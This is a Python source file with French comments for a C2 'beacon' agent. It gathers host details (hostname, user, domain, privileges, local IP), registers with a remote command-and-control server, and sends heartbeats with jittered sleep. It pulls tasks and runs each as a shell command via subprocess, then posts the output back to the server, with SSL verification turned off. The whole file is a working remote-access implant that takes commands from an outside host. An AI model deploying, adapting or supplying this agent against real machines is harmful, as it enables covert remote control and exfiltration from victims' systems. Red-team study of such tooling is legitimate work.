#!/usr/bin/env python3
"""
Beacon Agent - Version corrigée pour fonctionnement à distance
Supporte les connexions vers des serveurs distants (pas seulement localhost)
"""

import getpass
import logging
import os
import platform
import random
import socket
import subprocess
import time
from datetime import datetime, timezone
from typing import Dict, Optional, List, Any
from urllib.parse import urlparse

import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def _utc_now_iso() -> str:
    """Retourne la date UTC au format ISO"""
    return datetime.now(timezone.utc).isoformat()


def get_system_info() -> Dict:
    """Collecte les informations système"""
    try:
        return {
            "os": platform.system(),
            "os_version": platform.version(),
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "domain": os.environ.get("USERDOMAIN", "WORKGROUP"),
            "pid": os.getpid(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "privileges": "admin" if (hasattr(os, "geteuid") and os.geteuid() == 0) else "user",
        }
    except Exception as exc:
        logger.error("Error getting system info: %s", exc)
        return {}


def get_local_ip() -> str:
    """Récupère l'adresse IP locale"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def execute_command(command: str, timeout: int = 30) -> str:
    """Exécute une commande système et retourne le résultat"""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        output = result.stdout + result.stderr
        return output if output else "[+] Commande exécutée (pas de sortie)"
    except subprocess.TimeoutExpired:
        return "[!] Timeout - Commande trop longue"
    except Exception as e:
        return f"[!] Erreur: {e}"


class BeaconConfig:
    """Configuration de l'agent"""

    def __init__(self, server_url: str, listener_id: str, interval: int = 10, jitter: float = 0.2):
        self.server_url = server_url.rstrip('/')
        self.listener_id = listener_id
        self.beacon_interval = interval
        self.jitter = jitter
        self.agent_id: Optional[str] = None
        self.api_key: Optional[str] = None

    def jittered_sleep(self) -> int:
        """Calcule le prochain intervalle de sommeil avec jitter"""
        variance = int(self.beacon_interval * self.jitter * 1000)
        sleep_time = self.beacon_interval + random.uniform(-variance / 1000, variance / 1000)
        return max(int(sleep_time), 1)


class Beacon:
    """Agent C2 pour communication avec le serveur distant"""

    def __init__(self, server_url: str, listener_id: str, interval: int = 10, jitter: float = 0.2):
        self.config = BeaconConfig(server_url, listener_id, interval=interval, jitter=jitter)
        self.session = requests.Session()
        self.session.verify = False  # Désactiver SSL pour les certificats auto-signés
        self.is_running = True

    def register(self) -> bool:
        """Enregistre l'agent auprès du serveur C2"""
        logger.info("[*] Enregistrement auprès du serveur: %s", self.config.server_url)

        try:
            system_info = get_system_info()
            payload = {
                "listener_id": self.config.listener_id,
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "process_id": os.getpid(),
                "system_info": system_info,
                "agent_version": "remote-agent-1.0",
                "privileges": system_info.get("privileges", "user"),
                "operating_system": platform.system(),
                "ip_address": get_local_ip(),
            }

            response = self.session.post(
                f"{self.config.server_url}/api/auth/register",
                json=payload,
                timeout=10,
            )

            if response.status_code != 200:
                logger.error("[-] Échec d'enregistrement: %s", response.status_code)
                return False

            data = response.json()
            self.config.agent_id = data.get("agent_id")
            
            if data.get("sleep_interval"):
                self.config.beacon_interval = int(data.get("sleep_interval", 10))
            if data.get("jitter"):
                self.config.jitter = float(data.get("jitter", 0.2))

            logger.info("[+] Agent enregistré avec succès")
            logger.info("[+] Agent ID: %s", self.config.agent_id)
            logger.info("[+] Intervalle: %ss, Jitter: %s", self.config.beacon_interval, self.config.jitter)
            return True
            
        except Exception as exc:
            logger.error("[-] Erreur d'enregistrement: %s", exc)
            return False

    def send_heartbeat(self) -> bool:
        """Envoie un heartbeat au serveur"""
        if not self.config.agent_id:
            logger.error("[-] Agent non enregistré")
            return False

        try:
            system_info = get_system_info()
            payload = {
                "agent_id": self.config.agent_id,
                "listener_id": self.config.listener_id,
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "process_id": os.getpid(),
                "system_info": system_info,
                "agent_version": "remote-agent-1.0",
                "privileges": system_info.get("privileges", "user"),
                "operating_system": platform.system(),
                "event_type": "heartbeat",
                "signal": "heartbeat",
                "sleep_interval": self.config.beacon_interval,
                "jitter": self.config.jitter,
                "ip_address": get_local_ip(),
                "user_agent": "RemoteAgent/1.0",
                "uri": "/agent/heartbeat",
                "metadata": {
                    "timestamp": _utc_now_iso(),
                },
            }

            response = self.session.post(
                f"{self.config.server_url}/api/listeners/{self.config.listener_id}/heartbeat",
                json=payload,
                timeout=10,
            )
            
            if response.status_code == 200:
                logger.debug("[+] Heartbeat envoyé pour %s", self.config.agent_id)
                return True

            logger.warning("[-] Heartbeat rejeté: %s", response.status_code)
            return False
            
        except Exception as exc:
            logger.error("[-] Erreur heartbeat: %s", exc)
            return False

    def fetch_tasks(self) -> List[Dict[str, Any]]:
        """Récupère les tâches en attente depuis le serveur"""
        if not self.config.agent_id:
            return []

        try:
            response = self.session.get(
                f"{self.config.server_url}/api/agents/{self.config.agent_id}/tasks",
                timeout=10,
            )
            
            if response.status_code == 200:
                data = response.json()
                tasks = data.get("tasks", [])
                if tasks:
                    logger.info("[*] %d tâche(s) reçue(s)", len(tasks))
                return tasks
                
        except Exception as exc:
            logger.error("[-] Erreur récupération tâches: %s", exc)
        
        return []

    def execute_task(self, task: Dict[str, Any]) -> bool:
        """Exécute une tâche et envoie le résultat"""
        task_id = task.get("task_id") or task.get("id")
        command = task.get("command", "")
        
        if not task_id or not command:
            logger.warning("[-] Tâche invalide: %s", task)
            return False

        logger.info("[*] Exécution de la tâche %s: %s", task_id, command)
        
        # Exécuter la commande
        output = execute_command(command)
        
        # Envoyer le résultat
        try:
            payload = {
                "agent_id": self.config.agent_id,
                "task_id": task_id,
                "result": output,
                "status": "completed",
                "timestamp": _utc_now_iso(),
            }
            
            response = self.session.post(
                f"{self.config.server_url}/api/agents/{self.config.agent_id}/results",
                json=payload,
                timeout=10,
            )
            
            if response.status_code == 200:
                logger.info("[+] Résultat envoyé pour la tâche %s", task_id)
                return True
                
        except Exception as exc:
            logger.error("[-] Erreur envoi résultat: %s", exc)
        
        return False

    def run(self) -> None:
        """Boucle principale de l'agent"""
        logger.info("=" * 60)
        logger.info("C2 Agent - Remote Beacon")
        logger.info("=" * 60)
        logger.info("Serveur: %s", self.config.server_url)
        logger.info("Listener: %s", self.config.listener_id)
        logger.info("=" * 60)

        if not self.register():
            logger.error("[-] Échec d'enregistrement, arrêt de l'agent")
            return

        logger.info("[+] Démarrage de la boucle heartbeat (intervalle: %ss, jitter: %s)",
                    self.config.beacon_interval, self.config.jitter)

        while self.is_running:
            try:
                # Envoyer le heartbeat
                self.send_heartbeat()
                
                # Récupérer et exécuter les tâches
                tasks = self.fetch_tasks()
                for task in tasks:
                    self.execute_task(task)
                
                # Attendre avant le prochain cycle
                sleep_time = self.config.jittered_sleep()
                logger.debug("[*] Attente de %ss", sleep_time)
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                logger.info("[*] Agent arrêté par l'utilisateur")
                self.is_running = False
            except Exception as exc:
                logger.error("[-] Erreur dans la boucle principale: %s", exc)
                time.sleep(self.config.beacon_interval)


def main() -> None:
    """Point d'entrée principal"""
    import argparse

    parser = argparse.ArgumentParser(description="Agent C2 pour communication distante")
    parser.add_argument("--server", required=True, help="URL du serveur C2 (ex: http://192.168.1.21:8000)")
    parser.add_argument("--listener", required=True, help="ID du listener (ex: listener_xxx)")
    parser.add_argument("--interval", type=int, default=10, help="Intervalle heartbeat en secondes")
    parser.add_argument("--jitter", type=float, default=0.2, help="Pourcentage de jitter")
    
    args = parser.parse_args()

    beacon = Beacon(args.server, args.listener, interval=args.interval, jitter=args.jitter)
    beacon.run()


if __name__ == "__main__":
    main()
